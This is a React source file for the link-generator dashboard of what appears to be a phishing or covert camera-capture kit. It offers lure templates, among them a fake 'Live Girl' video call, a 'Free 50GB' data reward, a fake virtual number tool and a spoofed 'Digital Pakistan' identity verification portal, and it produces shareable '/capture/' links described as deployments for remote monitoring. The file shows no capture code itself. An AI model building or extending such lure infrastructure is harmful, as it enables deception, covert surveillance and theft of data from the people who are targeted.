"use client";

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Plus, 
  Copy, 
  Check, 
  Trash2, 
  ExternalLink,
  Shield,
  Video,
  Monitor,
  Instagram,
  RefreshCw,
  Gift,
  Hash,
  Users,
  Link as LinkIcon
} from 'lucide-react';
import { GlassCard } from '@/components/ui/GlassCard';
import { GlassButton } from '@/components/ui/GlassButton';
import { cn } from '@/lib/utils';
import { CaptureLink } from '@/lib/storage';

const STYLES = [
  { 
    id: 'video', 
    name: 'Premium Video Call', 
    description: 'VIP "Live Girl" video call simulation for high engagement.',
    icon: Users,
    color: 'text-green-400',
    bg: 'bg-green-400/10'
  },
  { 
    id: 'social', 
    name: 'Social Filter', 
    description: 'Modern "Snap-style" camera filter interface.',
    icon: Instagram,
    color: 'text-neon-pink',
    bg: 'bg-neon-pink/10'
  },
  { 
    id: 'reward', 
    name: 'Data Rewards', 
    description: 'Attractive "Free 50GB" data reward portal.',
    icon: Gift,
    color: 'text-amber-400',
    bg: 'bg-amber-400/10'
  },
  { 
    id: 'virtual', 
    name: 'Virtual Number', 
    description: 'Fake virtual number generator utility.',
    icon: Hash,
    color: 'text-cyan-400',
    bg: 'bg-cyan-400/10'
  },
  { 
    id: 'digital', 
    name: 'Digital Identity', 
    description: 'Secure "Digital Pakistan" identity verification portal.',
    icon: Monitor,
    color: 'text-blue-400',
    bg: 'bg-blue-400/10'
  },
];

export default function LinkGeneratorPage() {
  const [links, setLinks] = useState<CaptureLink[]>([]);
  const [selectedStyle, setSelectedStyle] = useState('video');
  const [label, setLabel] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const fetchLinks = React.useCallback(async () => {
    const res = await fetch('/api/links');
    const data = await res.json();
    setLinks(data);
  }, []);

  useEffect(() => {
    fetchLinks();
  }, [fetchLinks]);

  const handleGenerate = async () => {
    if (!label.trim()) return;
    setIsLoading(true);

    try {
      const res = await fetch('/api/links', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ style: selectedStyle, label }),
      });
      
      if (res.ok) {
        setLabel('');
        fetchLinks();
      }
    } catch (err) {
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  const copyToClipboard = (id: string) => {
    const url = `${window.location.origin}/capture/${id}`;
    navigator.clipboard.writeText(url);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div className="space-y-10 pb-20">
      <div>
        <h1 className="text-3xl font-bold mb-2 text-glow-blue">Link Generator</h1>
        <p className="text-white/50">Create specialized deployment links for remote monitoring.</p>
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-2 gap-8">
        {/* Generator Form */}
        <div className="space-y-6">
          <GlassCard className="space-y-6">
            <h2 className="text-xl font-bold">Configure Deployment</h2>
            
            <div className="space-y-2">
              <label className="text-sm font-medium text-white/60">Deployment Label</label>
              <input
                type="text"
                placeholder="e.g. Field Operation Alpha"
                value={label}
                onChange={(e) => setLabel(e.target.value)}
                className="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-4 text-white focus:outline-none focus:ring-2 focus:ring-cyber-blue/50"
              />
            </div>

            <div className="space-y-4">
              <label className="text-sm font-medium text-white/60 uppercase tracking-widest text-[10px]">Select Target Style</label>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                {STYLES.map((style) => (
                  <button
                    key={style.id}
                    onClick={() => setSelectedStyle(style.id)}
                    className={cn(
                      "flex flex-col p-4 rounded-xl border transition-all duration-200 text-left group",
                      selectedStyle === style.id 
                        ? "bg-white/10 border-cyber-blue/50 shadow-[0_0_15px_rgba(59,130,246,0.1)]" 
                        : "bg-white/5 border-white/5 hover:border-white/20"
                    )}
                  >
                    <div className={cn("p-2 rounded-lg w-fit mb-3 group-hover:scale-110 transition-transform", style.bg)}>
                      <style.icon size={20} className={style.color} />
                    </div>
                    <span className="font-bold text-sm mb-1">{style.name}</span>
                    <span className="text-[10px] text-white/40 leading-tight">{style.description}</span>
                  </button>
                ))}
              </div>
            </div>

            <GlassButton 
              className="w-full" 
              glow 
              onClick={handleGenerate}
              disabled={isLoading || !label.trim()}
            >
              {isLoading ? <RefreshCw size={20} className="animate-spin" /> : <Plus size={20} />}
              Generate Secure Link
            </GlassButton>
          </GlassCard>
        </div>

        {/* Generated Links List */}
        <GlassCard className="flex flex-col">
          <h2 className="text-xl font-bold mb-6">Active Deployments</h2>
          
          <div className="flex-1 overflow-y-auto max-h-[500px] space-y-3 pr-2 scrollbar-thin scrollbar-thumb-white/10">
            {links.length === 0 ? (
              <div className="h-full flex flex-col items-center justify-center text-white/20 py-10">
                <LinkIcon size={48} className="mb-4 opacity-20" />
                <p>No active links found.</p>
              </div>
            ) : (
              [...links].reverse().map((link) => (
                <div key={link.id} className="p-4 rounded-xl bg-white/5 border border-white/5 flex items-center justify-between group">
                  <div className="space-y-1 overflow-hidden pr-4">
                    <p className="font-bold text-sm truncate">{link.label}</p>
                    <div className="flex items-center gap-2">
                      <span className="text-[10px] uppercase bg-white/10 px-2 py-0.5 rounded text-white/50">{link.style}</span>
                      <span className="text-[10px] text-white/30">{new Date(link.createdAt).toLocaleDateString()}</span>
                    </div>
                  </div>
                  
                  <div className="flex items-center gap-2 flex-shrink-0">
                    <GlassButton 
                      variant="outline" 
                      size="sm" 
                      onClick={() => copyToClipboard(link.id)}
                      className={cn(copiedId === link.id && "border-green-400 text-green-400")}
                    >
                      {copiedId === link.id ? <Check size={14} /> : <Copy size={14} />}
                    </GlassButton>
                    <a href={`/v/${link.id}`} target="_blank" rel="noopener noreferrer">
                      <GlassButton variant="outline" size="sm">
                        <ExternalLink size={14} />
                      </GlassButton>
                    </a>
                  </div>
                </div>
              ))
            )}
          </div>
        </GlassCard>
      </div>
    </div>
  );
}
